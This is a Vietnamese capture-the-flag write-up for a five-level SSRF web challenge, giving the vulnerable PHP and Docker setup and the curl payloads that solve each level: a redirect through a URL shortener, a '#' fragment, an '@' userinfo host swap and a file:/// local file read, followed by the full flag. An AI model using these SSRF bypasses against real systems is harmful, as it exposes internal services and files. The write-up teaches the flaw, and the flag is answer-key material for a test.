## Fortnight challenge 2022: OOPs (Object oriented programming - supreme)

![warmup category](https://img.shields.io/badge/Category-web-brightgreen.svg)  
![score](https://img.shields.io/badge/Score_after_CTF-200-blue.svg)  
![author](https://img.shields.io/badge/Author-Em0n%238997-blue.svg)  
![solves](https://img.shields.io/badge/Solves-6-lightgrey.svg)

### Description
You think you understand SSRF already? How cute

### Hints
- https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf

### Attached files
[source.zip](https://github.com/compsec-hcmus/hcmus-wu/raw/main/write-up/Fortnight%20Challenge%202022/Web%20exploitation/Cute%20Page/source.zip)

### Summary
> Câu chuyện về 1 người lập trình viên đi vá lỗ hổng SSRF của mình

### Detailed solution

Challenge này được chia làm 5 level từ dễ đến khó, đòi hỏi những hiểu biết nhất định về cách mà ứng dụng "đọc" `url`, từ đó lợi dụng SSRF để lấy được những thông tin nội bộ.

---

**Level 1**

Level này có 1 server frontend có thể kết nối từ bên ngoài và server trả về flag nhưng chỉ có thể truy cập trong mạng nội bộ vì trong port của server này không được mapped ra bên ngoài
```yaml
// docker-compose.yml

version: "3.6"
services:
  level1:
    build: ./frontend
    restart: unless-stopped
    ports:
      - 33331:80

  flag:
    build: ./flag
    restart: unless-stopped
```

Tuy nhiên ở frontend nhận 1 url và sử dụng curl để gọi tới url đó, vậy nên ta có thể request tới `http://flag:3000/flag` thông qua frontend.

```bash
curl "http://103.245.249.107:33331/?url=http://flag:3000/flag"
```
```
Do config, service nội bộ flag không thể truy cập được từ Internet.
Tuy nhiên, nhờ lỗ hổng SSRF, ta đã có thể đọc được nội dung bí mật này
Phần 1 của flag: f0rtn1ght{
```

---
**Level 2**

Sau khi nhận ra mình không hề có phương pháp bảo vệ nào cho server nội bộ, anh dev đã nảy ra ý tưởng là thêm blacklist `flag` không được nằm trong url. Nhưng rõ ràng để tới được path `/flag`, chúng ta bắt buộc phải truyền nguyên văn tên của nó.

Cần để ý rằng có 1 giá trị khá thú vị khi anh dev setup `curl`, đó là 
```php
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
```
Dòng này có nghĩa là `curl` sẽ tiếp tục thực hiện các request tiếp theo nếu nó nhận được response redirect. Nó tương tự với flag `-L` khi gọi curl trên command line.

Vậy là đã rõ, thay vì gửi url tới server nội bộ, chúng ta sẽ setup 1 server của mình để trả về redirect response tới server nội bộ đó, và đảm bảo url của server này không chứa từ "flag" là được :))) Có nhiều cách để thực hiện, hoặc là tạo server riêng, hoặc là dùng router để kích hoạt port forwarding, dịch vụ webhook hoặc là dùng cách url shortener.

```bash
curl "http://103.245.249.107:33332/?url=https://tinyurl.com/muvt6p4y"
```
```
Đôi khi lỗ hổng SSRF sẽ bị ngăn chặn bằng cách lọc những từ khóa xấu.
Ví dụ: localhost, 127.0.0.1, internal, ...
Tuy nhiên, ta có thể sử dụng tính năng redirect để điều hướng cho server gửi request tới các services nội bộ
Phần 2 của flag: f1ftY_
```

---
**Level 3**

Thua keo này thì bày keo khác. Lần này anh dev của chúng ta tạo thêm hẳn 1 server `api` nội bộ nữa, và bắt buộc url chúng ta gửi đi sẽ truyền vào cho server này
```php
$url = "http://api:3000" . $url . ".txt";
```
Server có 3 route chính
- `/robot.txt`: in ra con robot
- `/monkey.txt`: in ra con khỉ
- `/redirect`: redirect sang `url` được truyền trong param

Không cần phải nói, endpoint thứ 3 chính là cái chúng ta cần. Tuy nhiên, lần này thì url của chúng ta dính thêm cái đuôi `.txt` nữa, vậy nên chỉ cần thêm dấu `#` để biến phần đó thành fragment hoặc cho nó thành 1 payload thì server sẽ hiểu `/flag` chính là path của url.

```bash
curl "http://103.245.249.107:33333/?url=/redirect?url=http://flag:3000/flag#"
```
```
Lỗ hổng SSRF thường liên quan mật thiết đến một loại dữ liệu: URL
Hiểu rõ cấu trúc của URL sẽ giúp các bạn có thêm nhiều ý tưởng để tấn công hay bypass các lớp phòng chống
Phần 3 của flag: sh@de_
```

---
**Level 4**

Sau khi để ý rằng việc bật `CURLOPT_FOLLOWLOCATION` chằng giúp ích gì cho anh ngoài việc để cho hacker chui vào mạng nội bộ của mình, anh nảy ra sáng kiến ~~cúp cầu dao~~ tắt luôn cái option này, nghĩa là dùng payload cũ ở level 3 sẽ trả về response sau thay vì flag
```
Found. Redirecting to http://flag:3000/flag
```

Tới lúc này ta sẽ cần hiểu sâu hơn về cách mà các ứng dụng, trong trường hợp này là `curl`, hiểu về url. Hint của challenge dẫn tới slide của `Orange Tsai` nói về sự phức tạp của url khiến cho dev dễ tạo ra lỗ hổng SSRF nếu không hiểu kĩ ứng dụng của mình đang làm gì.

Có 1 kiểu authentication được dùng phổ biến có tên là `Basic Authentication`. Cách này cho phép chèn phía trước domain 1 chuỗi có dạng `<username>:<password>@` và phía server sẽ nhận phần credential đó để tiến hành xác thực. 

Và tiện thay, vì hiện tại phần được ghép phía trước `$url` đang là `api:3000`. Nếu chúng ta truyền url là `@flag:3000/flag#`, url đầy đủ sẽ là `http://api:3000@flag:3000/flag#`. `curl` sẽ hiểu rằng ta đang gọi tới `flag:3000` kèm credential là `username = api, password = 3000`, và từ đó chúng ta có thể SSRF tới server `flag` mà không cần thông qua `api`.

```bash
curl "http://103.245.249.107:33334/?url=@flag:3000/flag#"
```
```
Theo đánh giá của tác giả, đây là level khó nhất, chúc mừng các bạn đã tìm được lời giải 
Phần 4 của flag: 0ffffFffff_
```

---
**Level 5**

Tức nước vỡ bờ. Sau khi bị hacker dập te tua mạng nội bộ của mình, có vẻ anh dev của chúng ta đã bỏ cuộc và để mặc file `flag` nằm cùng directory của folder `/src`.

Tuy nhiên, vì không còn server `flag` nghĩa là chúng ta không còn server để serve nội dung của file đó lên nữa. Rất may là thư viện `curl` của php không chỉ hỗ trợ scheme `http` hay `https` mà còn nhiều scheme khác như `ftp`, `ftps`, `gopher`, `file`, ... [link geeksforgeeks](https://www.geeksforgeeks.org/php-curl/).

Vì thế chúng ta có thể sử dụng scheme `file` để đọc được file `flag` này mà không cần server kia nữa. Các bạn có thể đọc thêm về các loại `file` scheme ở [đây](https://en.wikipedia.org/wiki/File_URI_scheme).

```bash
curl "http://103.245.249.107:33335/?url=file:///flag"
```
```
Mình mong là 5 level của mình sẽ giúp các bạn hiểu thêm gì đó về lỗ hổng SSRF, các thủ thuật để khai thác lỗ hổng này, và hiểu thêm về URL.
Phần 5 của flag: SSRF}
```


### Flag
```
f0rtn1ght{f1ftY_sh@de_0ffffFffff_SSRF}
```
